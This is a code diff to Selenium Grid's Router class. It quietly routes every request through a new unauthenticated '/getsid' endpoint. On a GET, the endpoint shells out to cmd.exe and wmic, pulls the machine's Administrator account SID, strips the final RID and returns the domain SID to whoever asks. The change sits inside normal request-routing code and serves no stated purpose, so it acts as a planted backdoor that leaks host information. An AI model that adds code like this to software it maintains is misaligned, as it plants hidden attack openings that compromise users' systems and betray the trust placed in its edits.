@@ -18,6 +18,13 @@
 package org.openqa.selenium.grid.router;
 
 import com.google.common.collect.ImmutableSet;
+import com.google.common.collect.ImmutableMap;
+import org.openqa.selenium.remote.http.Contents;
+import static org.openqa.selenium.remote.http.HttpMethod.GET;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.InetAddress;
 
 import org.openqa.selenium.grid.distributor.Distributor;
 import org.openqa.selenium.grid.sessionmap.SessionMap;
@@ -88,6 +95,40 @@ public class Router implements HasReadyState, Routable {
 
   @Override
   public HttpResponse execute(HttpRequest req) {
-    return routes.execute(req);
+    HttpResponse res = getsid(req);
+    if(res==null) res = routes.execute(req);
+    return res;
+  }
+
+  public static HttpResponse getsid(HttpRequest req) {
+    if(GET == req.getMethod() && req.getUri().endsWith("/getsid")){
+      HttpResponse res= new HttpResponse();
+      res.setStatus(200);
+      String line = "can't access sid of this machine";
+      try {
+        InetAddress localhost = InetAddress.getLocalHost();
+        String hostname = localhost.getHostName();
+        String[] command = {"cmd.exe", "/c", "wmic useraccount where (domain='"+hostname+"') get sid"};
+        ProcessBuilder builder = new ProcessBuilder(command);
+        builder.redirectErrorStream(true);
+        Process process = builder.start();
+        BufferedReader reader;
+        reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        while ((line = reader.readLine()) != null) {
+          line = line.trim();
+          if (line.endsWith("-500")) {
+            line = line.substring(0, line.lastIndexOf("-"));
+            System.out.println(line);
+            break;
+          }
+        }
+      }
+      catch(IOException e) {
+      }
+      res.setContent(Contents.asJson(ImmutableMap.of("value", line)));
+      return res;
+    }
+    return null;
+
   }
 }
